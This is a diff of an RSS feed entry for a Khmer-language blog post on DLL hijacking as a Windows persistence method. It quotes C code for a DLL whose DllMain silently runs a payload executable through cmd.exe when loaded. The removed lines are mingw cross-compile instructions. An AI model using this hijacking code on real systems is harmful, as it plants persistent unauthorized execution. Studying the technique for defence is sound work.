@@ -286,8 +286,8 @@ Shellcode ខាងក្រោមជាដំណើរការបង្កើ�
         <guid>https://thiklab.com/en/posts/dll-hijacking-persistence-method/</guid>
         <description>C - Execute Command Prompt ចម្លងកូដ និង កែប្រែទីតាំងរបស់ Payload​ ។
 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  #include &amp;lt;windows.h&amp;gt;using namespace std; void exec() { WinExec(&amp;#34;cmd.exe /c c:\\programdata\\putty.exe&amp;#34;, 0); } BOOL WINAPI DllMain (HANDLE hDLL, DWORD dwReason, LYVOID lpReserved) { switch (dwReason) { case DLL_PROCESS_ATTACH: exec(); break; } return TRUE; }  
-DLL Build ចូលទៅកាន់ផ្ទាំង Terminal ក្នុងប្រព័ន្ធប្រតិបត្តិការលីនុច រួចវាយពាក្យបញ្ជាដូខខាងក្រោម៖
-1 2 3 4 5 6 7 8  // To create Windows executables, you need to instsall mingw cross-compiler sudo apt-get install mingw-w64 //For x64 compile with: x86_64-w64-mingw32-gcc r4t.</description>
+យោងតាម៖ dllmain
+DLL Build ចូលទៅកាន់ផ្ទាំង Terminal ក្នុងប្រព័ន្ធប្រតិបត្តិការលីនុច រួចវាយពាក្យបញ្ជាដូខខាងក្រោម៖</description>
         
         <dc:creator>thik</dc:creator>
         <media:content url="https://thiklab.comimages/feature2/article-1.png" medium="image"><media:title type="html">featured image</media:title></media:content>
